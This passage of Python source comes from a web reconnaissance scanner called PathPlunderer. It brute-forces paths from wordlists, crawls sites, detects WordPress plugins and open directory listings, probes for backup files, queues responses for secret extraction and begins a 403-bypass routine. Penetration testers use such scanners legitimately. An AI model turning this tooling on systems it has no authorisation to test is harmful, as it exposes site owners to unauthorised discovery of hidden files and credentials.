        r"/_/    \__,_/\__/_/ /_/_/   /_/\__,_/_/ /_/\__,_/\___/_/   \___/_/      "
    ]

    # ── Accent bar — gradient chars ───────────────────────────────────────
    GRAD = "▓▒░"

    # colour helpers
    def c(s, col, bright=False):
        if no_color: return s
        b = "\033[1m" if bright else ""
        return b + col + s + "\033[0m"

    R  = "\033[91m"    # bright red
    Y  = "\033[93m"    # yellow
    C  = "\033[96m"    # cyan
    G  = "\033[92m"    # green
    DIM= "\033[2m"
    W  = "\033[97m"    # white
    M  = "\033[95m"    # magenta

    pad = lambda s: s.center(tw)

    # ── Art lines ─────────────────────────────────────────────────────────
    art_out = []
    colors_cycle = [Y, C, R, R, Y]
    for line, col in zip(ART, colors_cycle):
        centered = line.center(tw)
        art_out.append(c(centered, col, bright=True) if not no_color else centered)

    # ── Tag line ──────────────────────────────────────────────────────────
    name_ver = f"PathPlunderer  v{VERSION}"
    author   = "by VICTOR AZARIAH"
    tagline  = f"{name_ver}  {DIM}|{W}  {author}" if not no_color else f"{name_ver}  |  {author}"
    # visual length without ANSI
    tagline_plain = f"{name_ver}  |  {author}"
    tagline_pad   = " " * max(0, (tw - len(tagline_plain)) // 2)

    modes_plain = "dir  ·  subdomain  ·  vhost  ·  fuzz  ·  cloud  ·  xmlrpc"
    if no_color:
        modes_line = pad(modes_plain)
    else:
        parts = modes_plain.split("  ·  ")
        mode_colors = [C, G, C, G, C, M]
        sep = c("  ·  ", DIM)
        colored_modes = sep.join(c(p, col, True) for p, col in zip(parts, mode_colors))
        modes_line = " " * max(0, (tw - len(modes_plain)) // 2) + colored_modes

    result = (
        "\n"
        + "\n".join(art_out) + "\n"
        + tagline_pad + (c(name_ver, R, True) + c("  |  ", DIM) + c(author, W) if not no_color else tagline_plain) + "\n"
        + modes_line + "\n"
    )
    return result

@dataclass
class ScanResult:
    url:       str
    status:    int
    size:      int
    lines:     int = 0
    words:     int = 0
    redirect:  str = ""
    method:    str = "GET"
    note:      str = ""
    secrets:   List[Dict] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN DIR SCANNER CLASS
# ─────────────────────────────────────────────────────────────────────────────
# ── WordPress theme/plugin detector ──────────────────────────────────────────
_WP_SEEN: set = set()
_WP_LOCK = threading.Lock()

def _detect_wp_assets(url: str, body: str, no_color: bool = False):
    import re as _re
    found = []
    for m in _re.finditer(r'/wp-content/themes/([^/"\'?#\s]+)', body):
        name = m.group(1); key = "theme:"+name
        with _WP_LOCK:
            if key in _WP_SEEN: continue
            _WP_SEEN.add(key)
        vm = _re.search(r'/wp-content/themes/'+_re.escape(name)+r'/[^"\']*\?ver=([0-9][^\s"\'\&]+)', body)
        found.append(("THEME", name, vm.group(1) if vm else "?"))
    for m in _re.finditer(r'/wp-content/plugins/([^/"\'?#\s]+)', body):
        name = m.group(1); key = "plugin:"+name
        with _WP_LOCK:
            if key in _WP_SEEN: continue
            _WP_SEEN.add(key)
        vm = _re.search(r'/wp-content/plugins/'+_re.escape(name)+r'/[^"\']*\?ver=([0-9][^\s"\'\&]+)', body)
        found.append(("PLUGIN", name, vm.group(1) if vm else "?"))
    for kind, name, ver in found:
        col = Fore.MAGENTA if kind == "THEME" else Fore.CYAN
        tqdm.write(f"  {col}[WP-{kind}]{Style.RESET_ALL}  {name:<40} ver:{ver}  ({url})")


class PathPlunderer:
    def __init__(
        self,
        url: str,
        wordfile: str = "-",
        threads: int = DEFAULT_THREADS,
        exts: list = None,
        logfile: str = None,
        codes: list = None,
        blacklist_codes: list = None,
        user: str = None,
        password: str = None,
        force: bool = False,
        user_agent: str = None,
        random_agent: bool = False,
        proxy_url: str = "",
        replay_proxy: str = "",
        insecure: bool = False,
        timeout: int = DEFAULT_TIMEOUT,
        follow_redirect: bool = False,
        cookies: str = "",
        headers: str = "",
        no_canonicalize_headers: bool = False,
        methods: str = "GET",
        data: str = "",
        data_json: str = "",
        data_urlencoded: str = "",
        add_slash: bool = False,
        bypass_403: bool = False,
        bypass_only: bool = False,
        bypass_urls: list = None,
        wayback: bool = False,
        wayback_only: bool = False,
        wayback_all: bool = False,
        wayback_output: str = None,
        wayback_filter_status: list = None,
        extract_secrets: bool = False,
        extract_links: bool = False,
        wp_detect: bool = False,
        probe: bool = False,
        crawl: bool = True,          # NEW: crawl base URL for links
        rate_limit: float = DEFAULT_RATE_LIMIT,
        delay: float = 0.0,
        retry: bool = False,
        retry_attempts: int = DEFAULT_RETRY,
        quiet: bool = False,
        no_progress: bool = False,
        no_error: bool = False,
        no_color: bool = False,
        no_status: bool = False,
        hide_length: bool = False,
        output_json: bool = False,
        verbose: int = 0,
        no_recursion: bool = False,    # full recursion off by default
        smart_recurse: bool = True,    # smart recursion on by default (skip static dirs)
        depth: int = DEFAULT_DEPTH,
        filter_size: list = None,
        filter_words: list = None,
        filter_lines: list = None,
        filter_regex: str = None,
        filter_status: list = None,
        filter_similar: str = None,
        exclude_length: list = None,
        collect_backups: bool = False,
        collect_extensions: bool = False,
        collect_words: bool = False,
        wordlist_offset: int = 0,
        client_cert: str = None,
        client_key: str = None,
        debug: bool = False,
        auto_throttle: bool = False,
        burp: bool = False,
        query_params: str = "",
        pattern_file: str = None,
        dont_scan: list = None,
        response_size_limit: int = DEFAULT_RESP_LIMIT,
    ):
        # ── wordlist ──
        self.wordlist = []
        # Default wordlist: wordlists/common.txt next to this script
        _script_dir = Path(__file__).parent
        _default_wl = _script_dir / "wordlists" / "common.txt"
        if wordfile == "-" and _default_wl.exists() and (bypass_only is False):
            if sys.stdin.isatty():
                wordfile = str(_default_wl)
        if not bypass_only:
            if wordfile == "-":
                if not sys.stdin.isatty():
                    self.wordlist = [line.strip() for line in sys.stdin if line.strip()]
                else:
                    raise ValueError(
                        f"No wordlist specified and default not found at {_default_wl}.\n"
                        f"  Use -w <file>  or create wordlists/common.txt next to this script."
                    )
            else:
                wf = Path(wordfile)
                if not wf.exists():
                    raise FileNotFoundError(f"Wordlist not found: {wordfile}")
                with open(wf, encoding="utf-8", errors="ignore") as f:
                    self.wordlist = [line.strip() for line in f if line.strip()]
            if wordlist_offset:
                self.wordlist = self.wordlist[wordlist_offset:]

        # Pattern substitutions
        self.patterns = []
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f:
                    self.patterns = [l.strip() for l in f if l.strip()]
        if self.patterns:
            expanded = []
            for word in self.wordlist:
                for pat in self.patterns:
                    expanded.append(word.replace("{PATTERN}", pat))
            self.wordlist.extend(expanded)

        # ── URL ──
        if not url.startswith(("http://", "https://")):
            url = _detect_scheme(url)
        self.url = self.base_url = url if url.endswith("/") else url + "/"
        self.wordfile = wordfile

        # ── options ──
        self.threads         = threads
        self.exts            = lister(exts) if exts else ['']
        self.logfile         = logfile
        self.codes           = lister(codes) if codes else DEFAULT_STATUS_CODES[:]
        self.blacklist_codes = lister(blacklist_codes) if blacklist_codes else DEFAULT_BLACKLIST[:]
        self.user            = user
        self.password        = password
        self.force           = force
        self.random_agent    = random_agent
        self.user_agent      = (choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent()))
        self.proxy_url       = proxy_url
        self.replay_proxy    = replay_proxy
        self.insecure        = insecure
        self.timeout         = timeout
        self.follow_redirect = follow_redirect
        self.cookies_raw     = cookies
        self.headers_raw     = headers
        self.no_canon_hdrs   = no_canonicalize_headers
        self.methods         = methods.upper()
        self.data            = data
        self.add_slash       = add_slash
        self.bypass_403      = bypass_403
        self.bypass_only     = bypass_only
        self.bypass_urls     = bypass_urls or []
        self.wayback         = wayback
        self.wayback_only    = wayback_only
        self.wayback_all     = wayback_all
        self.wayback_output  = wayback_output
        self.wayback_filter_status = [int(s) for s in wayback_filter_status] if wayback_filter_status else []
        self.do_extract_secrets = extract_secrets
        self.do_extract_links   = extract_links
        self.wp_detect           = wp_detect
        self.probe              = probe
        self.crawl              = crawl
        self.rate_limiter    = RateLimiter(rate_limit)
        self.delay           = delay
        self.retry           = retry
        self.retry_attempts  = retry_attempts
        self.quiet           = quiet
        self.no_progress     = no_progress
        self.no_error        = no_error
        self.no_color        = no_color
        self.no_status       = no_status
        self.hide_length     = hide_length
        self.output_json     = output_json
        self.verbose         = verbose
        self.no_recursion    = no_recursion
        self.smart_recurse   = smart_recurse
        self.depth           = depth
        self.filter_size     = [int(s) for s in filter_size] if filter_size else []
        self.filter_words    = [int(w) for w in filter_words] if filter_words else []
        self.filter_lines    = [int(l) for l in filter_lines] if filter_lines else []
        self.filter_regex    = re.compile(filter_regex) if filter_regex else None
        self.filter_status   = [int(c) for c in filter_status] if filter_status else []
        self.exclude_length  = [int(x) for x in exclude_length] if exclude_length else []
        self.filter_similar  = filter_similar
        self.collect_backups = collect_backups
        self.collect_exts    = collect_extensions
        self.collect_words   = collect_words
        self.client_cert     = client_cert
        self.client_key      = client_key
        self.debug           = debug
        self.auto_throttle   = auto_throttle
        self.query_params    = query_params
        self.dont_scan       = dont_scan or []
        self.resp_size_limit = response_size_limit

        if burp:
            self.proxy_url = "http://127.0.0.1:8080"; self.insecure = True

        if data_json:
            self.data        = data_json
            self.headers_raw = (headers + ",Content-Type: application/json").lstrip(",")
            self.methods     = "POST"
        elif data_urlencoded:
            self.data        = data_urlencoded
            self.headers_raw = (headers + ",Content-Type: application/x-www-form-urlencoded").lstrip(",")
            self.methods     = "POST"

        # ── state ──
        self.results:        List[ScanResult] = []
        self.found_paths:    List[str]        = []
        self.discovered_exts: set             = set()
        self.discovered_words: set            = set()
        self.all_secrets:    List[Dict]       = []
        self.dir_listing_dirs: Set[str]       = set()   # confirmed open listings → crawl-only
        self.wildcard_hash:  Optional[str]    = None
        self.wildcard_body:  Optional[bytes]  = None
        self.filter_similar_body: Optional[bytes] = None
        self._lock                 = threading.Lock()
        self._print_lock           = threading.Lock()   # serialise tqdm.write()
        self.auth                  = None
        self.start_time            = 0.0
        self._timeout_count        = 0
        self._stop                 = threading.Event()
        self._pending_secret_urls: List[tuple] = []
        self._pending_bypass:      List[tuple] = []
        self._requested_targets:   Set[str]    = set()
        self._crawled_urls:        Set[str]    = set()  # track crawled to avoid loops
        self._req_window:          List[bool]  = []
        self._req_completed:       int         = 0
        self._current_threads      = self.threads
        self._throttled            = False
        self._last_throttle_time:  float       = 0.0

    # ──────────────────────────────────────────────────────────────────────
    #  SESSION FACTORY
    # ──────────────────────────────────────────────────────────────────────
    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
            logging.captureWarnings(True)
        ua = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        session.headers["User-Agent"] = ua
        if self.headers_raw:
            for item in [h.strip() for h in self.headers_raw.split(",") if ":" in h]:
                k, v = item.split(":", 1)
                key = k.strip() if self.no_canon_hdrs else k.strip().title()
                session.headers[key] = v.strip()
        if self.cookies_raw:
            for cookie in self.cookies_raw.split(","):
                if "=" in cookie:
                    k, v = cookie.split("=", 1)
                    session.cookies.set(k.strip(), v.strip())
        if self.client_cert and self.client_key:
            session.cert = (self.client_cert, self.client_key)
        elif self.client_cert:
            session.cert = self.client_cert
        if self.auth:
            session.auth = self.auth
        return session

    # ──────────────────────────────────────────────────────────────────────
    #  REQUEST WRAPPER
    # ──────────────────────────────────────────────────────────────────────
    def _request(self, session: requests.Session, method: str, url: str,
                 headers: dict = None, data=None) -> Optional[requests.Response]:
        if any(skip in url for skip in self.dont_scan): return None
        if self._stop.is_set(): return None
        if self.query_params:
            sep = "&" if "?" in url else "?"
            url = url + sep + self.query_params
        attempts = self.retry_attempts if self.retry else 1
        for attempt in range(attempts):
            try:
                self.rate_limiter.acquire()
                if self.delay > 0: time.sleep(self.delay)
                resp = session.request(
                    method, url, headers=headers or {}, data=data,
                    timeout=self.timeout, allow_redirects=self.follow_redirect,
                )
                self._record_result(is_error=False)
                return resp
            except requests.exceptions.Timeout:
                with self._lock: self._timeout_count += 1
                self._record_result(is_error=True)
                if attempt == attempts - 1 and (self.verbose >= 2 or self.debug):
                    tqdm.write(Fore.RED + f"  [TIMEOUT] {url}" + Fore.RESET)
            except requests.exceptions.ConnectionError:
                self._record_result(is_error=True)
                if attempt == attempts - 1 and (self.verbose >= 2 or self.debug):
                    tqdm.write(Fore.RED + f"  [CONN_ERR] {url}" + Fore.RESET)
            except Exception as e:
                self._record_result(is_error=True)
                if self.debug: tqdm.write(Fore.RED + f"  [ERROR] {url}: {e}" + Fore.RESET)
                break
        return None

    def _record_result(self, is_error: bool):
        if not self.auto_throttle: return
        with self._lock:
            self._req_completed += 1
            if self._req_completed < AUTOTHROTTLE_WARMUP: return
            self._req_window.append(is_error)
            if len(self._req_window) > AUTOTHROTTLE_WINDOW: self._req_window.pop(0)
            if len(self._req_window) < AUTOTHROTTLE_WINDOW: return
            err_rate = sum(self._req_window) / len(self._req_window)
            if err_rate < AUTOTHROTTLE_THRESH: return
            now = time.monotonic()
            if now - self._last_throttle_time < AUTOTHROTTLE_COOLDOWN: return
            if self._current_threads <= AUTOTHROTTLE_MIN: return
            new_t = max(AUTOTHROTTLE_MIN, int(self._current_threads * AUTOTHROTTLE_STEP))
            self._current_threads = new_t; self._last_throttle_time = now
            self._throttled = True; self._req_window.clear()
            tqdm.write(Fore.YELLOW
                + f"  [AUTO-THROTTLE] {err_rate*100:.0f}% errors → threads → {new_t}"
                + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  CRAWL  — fetch a page, extract links, classify by extension
    # ──────────────────────────────────────────────────────────────────────
    def _crawl_url(self, session: requests.Session, url: str) -> Tuple[List[str], List[str]]:
        """Fetch URL, extract links from parseable body.

        Returns (follow_links, sensitive_hits):
          follow_links   — URLs to recurse into (HTML/JS/JSON/unknown ext)
          sensitive_hits — URLs with sensitive extensions to surface as findings
                           WITHOUT parsing (pdf, zip, sql, bak, etc.)
        Junk extensions (images, fonts, css, media) are silently dropped.
        """
        if url in self._crawled_urls: return [], []
        with self._lock:
            self._crawled_urls.add(url)

        # Classify the URL itself by extension before fetching
        url_path = urlparse(url).path.lower()
        fname    = url_path.rsplit("/", 1)[-1]
        url_ext  = ("." + fname.rsplit(".", 1)[-1]) if "." in fname else ""

        # Silently drop junk — don't even request them
        if url_ext in CRAWL_JUNK_EXTS:
            return [], []

        resp = self._request(session, "GET", url)
        if resp is None or resp.status_code == 404: return [], []

        ct = resp.headers.get("Content-Type", "").lower()

        # Sensitive extension → surface as finding, skip body parsing
        if url_ext in CRAWL_SENSITIVE_EXTS:
            return [], [url]

        # Binary content-type with no useful text → drop silently
        if any(t in ct for t in ("image/", "video/", "audio/", "font/",
                                  "application/octet-stream", "application/pdf",
                                  "text/css")):
            return [], []

        # ── Parse body for links ──────────────────────────────────────────
        links = extract_links(url, resp.text, same_origin_only=True)

        # JS files: also pull out absolute path string literals
        if "javascript" in ct or url_ext == ".js":
            for m in re.finditer(r'["\'](/[a-zA-Z0-9_\-/\.]{3,150})["\']', resp.text):
                parsed = urlparse(self.url)
                links.append(f"{parsed.scheme}://{parsed.netloc}{m.group(1)}")

        if self.wp_detect:
            _detect_wp_assets(url, resp.text, self.no_color)

        # Classify each discovered link by extension
        follow_links:   List[str] = []
        sensitive_hits: List[str] = []
        for lnk in links:
            lpath = urlparse(lnk).path.lower()
            lfname = lpath.rsplit("/", 1)[-1]
            lext   = ("." + lfname.rsplit(".", 1)[-1]) if "." in lfname else ""
            if lext in CRAWL_JUNK_EXTS:
                continue                         # silently drop
            elif lext in CRAWL_SENSITIVE_EXTS:
                sensitive_hits.append(lnk)       # report, don't recurse
            else:
                follow_links.append(lnk)         # follow normally

        return follow_links, sensitive_hits


    def _crawl_for_dir(self, session: requests.Session,
                       base_url: str,
                       dirbust_results: List["ScanResult"]) -> Set[str]:
        """Crawl pages found during dirbust of base_url. Surface missed URLs and
        return a set of new directory URLs (ending with /) for recursion.

        Extension rules:
          CRAWL_JUNK_EXTS  (.css/.png/.jpg/fonts/media)   -- silently dropped
          CRAWL_SENSITIVE_EXTS (.pdf/.zip/.sql/.bak etc.)  -- HEAD-check, print, no parse
          Everything else                                  -- GET, print, parse for more links
        """
        # Seed: base_url itself + all successful pages from THIS dir's dirbust
        # Dir-listing pages are always included so their directory entries are harvested
        seed_urls: Set[str] = {base_url}
        for res in dirbust_results:
            if res.status < 400:
                seed_urls.add(res.url)
            # Dir-listing without trailing slash: also seed the slash variant
            if "DIR-LISTING" in res.note:
                seed_urls.add(res.url.rstrip("/") + "/")

        # Paths already known globally (across all dirs scanned so far)
        already_found: Set[str] = {
            urlparse(r.url).path.rstrip("/").lower() for r in self.results
        }

        # 1-pass crawl (max 2 levels deep)
        to_crawl:      Set[str] = set(seed_urls)
        all_follow:    Set[str] = set()
        all_sensitive: Set[str] = set()
        depth = 0

        while to_crawl and depth < 2 and not self._stop.is_set():
            next_batch: Set[str] = set()
            for cu in list(to_crawl):
                if self._stop.is_set(): break
                follow, sensitive = self._crawl_url(session, cu)
                for lnk in follow:
                    if lnk not in all_follow:
                        all_follow.add(lnk); next_batch.add(lnk)
                        # -g / --links: harvest path segments from crawled URLs
                        if self.collect_words or self.do_extract_links:
                            lpath = urlparse(lnk).path.strip("/")
                            for seg in lpath.split("/"):
                                seg = seg.strip()
                                if seg and len(seg) >= 2:
                                    with self._lock:
                                        self.discovered_words.add(seg)
                                        base_seg = seg.rsplit(".", 1)[0] if "." in seg else seg
                                        if len(base_seg) >= 2:
                                            self.discovered_words.add(base_seg)
                all_sensitive.update(sensitive)
            to_crawl = next_batch - self._crawled_urls
            depth += 1

        found_crawl = 0
        new_dirs: Set[str] = set()

        # Sensitive files -- HEAD-check, show, never parse
        for u in sorted(all_sensitive):
            if self._stop.is_set(): break
            path_norm = urlparse(u).path.rstrip("/").lower()
            if path_norm in already_found: continue
            norm_u = u.rstrip("/").lower()
            with self._lock:
                if norm_u in self._requested_targets: continue
                self._requested_targets.add(norm_u)
            resp = self._request(session, "HEAD", u)
            if resp is None: resp = self._request(session, "GET", u)
            if resp is None or resp.status_code == 404: continue
            if self._should_filter(resp): continue
            size  = int(resp.headers.get("Content-Length", 0))
            fname = urlparse(u).path.rsplit("/", 1)[-1]
            fext  = ("." + fname.rsplit(".", 1)[-1]).upper() if "." in fname else ""
            result = ScanResult(
                url=resp.url, status=resp.status_code, size=size,
                method="HEAD", note=f"CRAWL | {fext}" if fext else "CRAWL"
            )
            with self._lock:
                self.results.append(result)
                already_found.add(path_norm)
            with self._print_lock:
                tqdm.write(self._format_result(result))
                if self.logfile: self._log(self._format_result(result))
            found_crawl += 1

        # Regular/navigable links -- GET, show, collect new dirs
        new_urls = [
            lnk for lnk in sorted(all_follow)
            if urlparse(lnk).path.rstrip("/").lower() not in already_found
        ]

        def _dir_listing_check(body: str) -> bool:
            bl = body[:4096].lower()
            return ("index of /" in bl or "<title>index of" in bl
                    or "directory listing for" in bl or "parent directory</a>" in bl)

        for u in new_urls:
            if self._stop.is_set(): break
            norm_u = u.rstrip("/").lower()
            with self._lock:
                if norm_u in self._requested_targets: continue
                self._requested_targets.add(norm_u)
            resp = self._request(session, "GET", u)
            if resp is None: continue
            if resp.status_code == 404: continue
            if self._should_filter(resp): continue

            size   = len(resp.content)
            bt     = resp.text
            lines_ = bt.count("\n") + 1 if bt.strip() else 0
            words_ = len(bt.split())     if bt.strip() else 0
            redir  = resp.headers.get("Location", "") if resp.status_code in (301, 302, 307, 308) else ""

            # ── Dir listing detection in crawl results ───────────────────────
            is_dir_listing = (resp.status_code == 200 and _dir_listing_check(bt))
            note = "CRAWL | DIR-LISTING" if is_dir_listing else "CRAWL"
            if is_dir_listing:
                with self._print_lock:
                    tqdm.write(Fore.YELLOW + f"  [DIR-LIST] Open directory listing: {resp.url}" + Fore.RESET)

            # Detect new directory for recursion queue
            dir_url = None
            if resp.url.endswith("/"):
                dir_url = resp.url
            elif resp.status_code in (301, 302, 307, 308):
                loc = resp.headers.get("Location", "")
                if loc.endswith("/"):
                    dir_url = loc if loc.startswith("http") else urljoin(resp.url.rstrip("/") + "/", loc.lstrip("/"))
            if dir_url and dir_url not in (self.base_url, base_url):
                new_dirs.add(dir_url)
            # Dir listing URLs should always be recursed into
            if is_dir_listing and resp.url not in (self.base_url, base_url):
                new_dirs.add(resp.url if resp.url.endswith("/") else resp.url + "/")

            result = ScanResult(url=resp.url, status=resp.status_code, size=size,
                                lines=lines_, words=words_, redirect=redir,
                                method="GET", note=note)
            with self._lock:
                self.results.append(result)
                already_found.add(urlparse(resp.url).path.rstrip("/").lower())
            with self._print_lock:
                tqdm.write(self._format_result(result))
                if self.logfile: self._log(self._format_result(result))
            found_crawl += 1

        return new_dirs

    # ──────────────────────────────────────────────────────────────────────
    #  RESPONSE FILTERING
    # ──────────────────────────────────────────────────────────────────────
    def _should_filter(self, resp: requests.Response) -> bool:
        size = len(resp.content); body = resp.text
        if self.filter_status and resp.status_code in self.filter_status: return True
        if self.blacklist_codes and resp.status_code in self.blacklist_codes: return True
        if self.filter_size and size in self.filter_size: return True
        if self.exclude_length and size in self.exclude_length: return True
        if self.filter_words:
            if len(body.split()) in self.filter_words: return True
        if self.filter_lines:
            if len(body.splitlines()) in self.filter_lines: return True
        if self.filter_regex and self.filter_regex.search(body): return True
        if self.wildcard_hash and page_hash(resp.content) == self.wildcard_hash: return True
        if self.filter_similar_body is not None:
            if similarity_ratio(resp.content, self.filter_similar_body) > 0.95: return True
        return False

    # ──────────────────────────────────────────────────────────────────────
    #  FORMAT RESULT LINE
    # ──────────────────────────────────────────────────────────────────────
    def _format_result(self, result: ScanResult) -> str:
        nc = self.no_color
        def col(s, c): return s if nc else (c + s + Fore.RESET)

        sc = result.status
        if   sc < 200:         sc_col = Fore.WHITE
        elif sc < 300:         sc_col = Fore.GREEN
        elif sc < 400:         sc_col = Fore.BLUE
        elif sc in (401, 403): sc_col = Fore.YELLOW
        elif sc >= 500:        sc_col = Fore.MAGENTA
        else:                  sc_col = Fore.RED

        # Fixed-width columns — every field right-padded, aligned like a spreadsheet
        # [status 3] [method 4] [lines 6l] [words 8w] [bytes 9c]  [url]
        sc_s   = col(f"{sc:<3}",            sc_col)
        meth_s = col(f"{result.method:<4}", Fore.CYAN)

        if not self.hide_length:
            lc_s = col(f"{result.lines:>5}l", Fore.WHITE)
            wc_s = col(f"{result.words:>7}w", Fore.WHITE)
            sz_s = col(f"{result.size:>9}c",  Fore.WHITE)
            metrics = f" {lc_s} {wc_s} {sz_s}"
        else:
            metrics = ""

        redir = f"  {col(chr(8594), Fore.BLUE)} {col(result.redirect, Fore.BLUE)}" if result.redirect else ""
        note  = f"  {col('['+result.note+']',  Fore.YELLOW)}"                       if result.note     else ""
        sec   = f"  {col('[SECRETS!]',         Fore.RED + Style.BRIGHT)}"           if result.secrets  else ""
        url   = col(result.url, sc_col if sc < 300 else Fore.WHITE)

        if self.no_status:
            return f"  {url}{metrics}{redir}{note}{sec}"
        return f"  {sc_s}  {meth_s}{metrics}  {url}{redir}{note}{sec}"

    # ──────────────────────────────────────────────────────────────────────
    #  CORE BRUTE WORKER
    # ──────────────────────────────────────────────────────────────────────
    def _brute(self, get_session, base: str, filename: str, pbar):
        filename = filename.lstrip("/")
        target   = base + filename
        if self.add_slash and not target.endswith("/"): target += "/"
        norm = target.rstrip("/").lower()
        with self._lock:
            if norm in self._requested_targets:
                if pbar: pbar.update(1)
                return
            self._requested_targets.add(norm)
        session  = get_session()
        resp     = self._request(session, self.methods, target, data=self.data)
        if pbar: pbar.update(1)
        if resp is None: return
        if resp.status_code not in self.codes: return
        if self._should_filter(resp): return

        size     = len(resp.content)
        redirect = resp.headers.get("Location","") if resp.status_code in (301,302,307,308) else ""

        _bt    = resp.text
        _lines = _bt.count("\n") + 1 if _bt.strip() else 0
        _words = len(_bt.split())     if _bt.strip() else 0
        # ── Directory listing detection (on 200 responses, no trailing slash required) ──
        def _check_dir_listing(body: str) -> bool:
            bl = body[:4096].lower()
            return ("index of /" in bl or "<title>index of" in bl
                    or "directory listing for" in bl or "parent directory</a>" in bl)

        # ── Directory listing detection ──────────────────────────────────────
        is_dir_listing = (resp.status_code == 200 and _check_dir_listing(_bt))
        if is_dir_listing:
            result = ScanResult(url=resp.url, status=resp.status_code, size=size,
                                lines=_lines, words=_words,
                                redirect=redirect, method=self.methods,
                                note="DIR-LISTING")
            with self._print_lock:
                tqdm.write(Fore.YELLOW + f"  [DIR-LIST] Open directory listing: {resp.url}" + Fore.RESET)
        else:
            result = ScanResult(url=resp.url, status=resp.status_code, size=size,
                                lines=_lines, words=_words,
                                redirect=redirect, method=self.methods)

        # ── Compute dir_url once (used for recursion + redirect dir-listing check) ──
        dir_url: Optional[str] = None
        if not self.no_recursion and resp.status_code < 404:
            if resp.url.endswith("/"):
                dir_url = resp.url
            elif resp.status_code in (301, 302, 307, 308):
                loc = resp.headers.get("Location", "")
                if loc.endswith("/"):
                    dir_url = loc if loc.startswith("http") else urljoin(
                        resp.url.rstrip("/") + "/", loc.lstrip("/"))
            # Dir listing at a URL without trailing slash: force recursion into it
            if dir_url is None and is_dir_listing:
                dir_url = resp.url.rstrip("/") + "/"

        # ── If it's a redirect to a dir, follow once to check for dir listing ──
        redirect_is_dir_listing = False
        if (dir_url and dir_url not in (self.base_url, base)
                and resp.status_code in (301, 302, 307, 308)):
            follow_resp = self._request(session, "GET", dir_url)
            if follow_resp and follow_resp.status_code == 200:
                if _check_dir_listing(follow_resp.text):
                    redirect_is_dir_listing = True
                    fr_size  = len(follow_resp.content)
                    fr_bt    = follow_resp.text
                    fr_lines = fr_bt.count("\n") + 1 if fr_bt.strip() else 0
                    fr_words = len(fr_bt.split()) if fr_bt.strip() else 0
                    dir_result = ScanResult(
                        url=follow_resp.url, status=200, size=fr_size,
                        lines=fr_lines, words=fr_words,
                        method="GET", note="DIR-LISTING")
                    with self._print_lock:
                        tqdm.write(Fore.YELLOW + f"  [DIR-LIST] Open directory listing: {follow_resp.url}" + Fore.RESET)
                        if self.logfile: self._log(f"  [DIR-LIST] Open directory listing: {follow_resp.url}")
                    with self._lock:
                        self.results.append(dir_result)
                        # Register so scan loop skips dirbust for this dir
                        listing_url = follow_resp.url if follow_resp.url.endswith("/") else follow_resp.url + "/"
                        self.dir_listing_dirs.add(listing_url)
                        if self.do_extract_secrets:
                            self._pending_secret_urls.append((follow_resp.url, fr_bt))

        with self._lock:
            self.results.append(result)
            if self.do_extract_secrets and resp.status_code < 400:
                self._pending_secret_urls.append((resp.url, resp.text))
            if self.bypass_403 and resp.status_code == 403:
                self._pending_bypass.append((base, filename))
            # ── Register direct dir-listing hits ────────────────────────────
            if is_dir_listing:
                self.dir_listing_dirs.add(resp.url if resp.url.endswith("/") else resp.url + "/")
            # ── Queue dir for recursion ──────────────────────────────────────
            if dir_url and dir_url not in (self.base_url, base):
                if dir_url not in self.found_paths:
                    self.found_paths.append(dir_url)
            # ── -E: collect extensions from found file AND from discovered links ──
            if self.collect_exts:
                # Extension from the wordlist hit itself
                if "." in filename:
                    self.discovered_exts.add("." + filename.rsplit(".", 1)[-1])
                # Extensions from all URLs found in the response body
                if resp.status_code < 400 and _bt:
                    try:
                        for lnk in extract_links(resp.url, _bt, same_origin_only=True):
                            lp = urlparse(lnk).path
                            lf = lp.rsplit("/", 1)[-1]
                            if "." in lf:
                                ext = "." + lf.rsplit(".", 1)[-1].lower()
                                if len(ext) <= 6 and ext.isalpha() or ext in ('.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.cfm', '.cgi', '.pl', '.py', '.rb', '.env', '.json', '.xml', '.yaml', '.yml', '.conf', '.config', '.ini', '.log', '.bak', '.sql', '.gz', '.zip'):
                                    self.discovered_exts.add(ext)
                    except Exception:
                        pass
            # ── -g / --links: extract ALL path segments from response HTML/JS ──
            if (self.collect_words or self.do_extract_links) and resp.status_code < 400:
                try:
                    for lnk in extract_links(resp.url, _bt, same_origin_only=True):
                        lpath = urlparse(lnk).path.strip("/")
                        # Collect every path segment (not just the last one)
                        for seg in lpath.split("/"):
                            seg = seg.strip()
                            if not seg or len(seg) < 2:
                                continue
                            # Full segment (e.g. "reset_password", "user-profile.php")
                            self.discovered_words.add(seg)
                            # Base name without extension
                            base_seg = seg.rsplit(".", 1)[0] if "." in seg else seg
                            if base_seg and len(base_seg) >= 2:
                                self.discovered_words.add(base_seg)
                except Exception:
                    pass

        # ── Print: dir-listing → banner only; redirect-to-listing → suppress 301 line; normal → metrics ──
        if is_dir_listing or redirect_is_dir_listing:
            pass  # [DIR-LIST] banner already printed above; no metrics line wanted
        else:
            line = self._format_result(result)
            with self._print_lock:
                tqdm.write(line)
                if self.logfile: self._log(line)

        # ── --db: check backup variants on found files (and redirect targets) ──
        if self.collect_backups and resp.status_code < 500:
            for bext in BACKUP_EXTS:
                if self._stop.is_set(): break
                bresp = self._request(session, "GET", target + bext)
                if bresp is None: continue
                # Accept 200, 201, 204, 301, 302 — anything that looks real
                if bresp.status_code >= 400 or self._should_filter(bresp): continue
                br = ScanResult(url=bresp.url, status=bresp.status_code,
                                size=len(bresp.content), note="BACKUP")
                brl = self._format_result(br)
                with self._print_lock:
                    tqdm.write(brl)
                    if self.logfile: self._log(brl)
                with self._lock: self.results.append(br)

    # ──────────────────────────────────────────────────────────────────────
    #  403 BYPASS RUNNER
    # ──────────────────────────────────────────────────────────────────────
    def _run_bypass(self, session: requests.Session, base: str, path: str):
        tqdm.write(Fore.YELLOW + f"\n  [403 BYPASS] Targeting: {base}{path}" + Fore.RESET)
        variations  = generate_bypass_paths(base.rstrip("/"), path)
        bypass_found = 0

        def _try_var(var):
            if self._stop.is_set(): return None
